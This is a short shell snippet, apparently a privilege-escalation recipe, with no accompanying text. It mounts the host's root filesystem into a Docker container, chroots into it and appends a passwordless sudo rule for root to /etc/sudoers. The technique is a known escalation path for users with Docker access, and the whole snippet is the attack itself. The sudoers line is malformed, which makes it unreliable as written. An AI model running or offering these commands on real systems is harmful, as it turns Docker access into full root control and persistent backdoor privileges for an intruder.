```shell
 docker run -it --rm -v /:/host alpine sh
 ls /host 
 chroot /host /bin/sh
 echo "root ALL=(ALL) ALL NOPASSWD: ALL" >> /etc/sudoers
```

